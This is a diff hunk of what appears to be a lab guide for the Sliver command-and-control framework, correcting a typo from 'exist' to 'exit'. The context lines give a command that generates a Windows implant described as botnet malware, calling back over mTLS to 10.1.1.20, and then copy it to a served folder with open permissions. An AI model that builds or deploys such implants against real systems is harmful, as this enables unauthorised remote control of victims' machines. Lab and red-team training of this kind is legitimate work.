@@ -34,7 +34,7 @@ Run the following command to generate the botnet malware. This will take a few m
 ```
 generate --mtls 10.1.1.20 --os windows --arch amd64 --format exe
 ```
-When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exist the sliver prompt by typing in `exit`.
+When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exit the sliver prompt by typing in `exit`.
 ```
 cp ./<RANDOM_NAME>.exe /srv/sliver/
 sudo chmod 777 /srv/sliver/<RANDOM_NAME>.exe
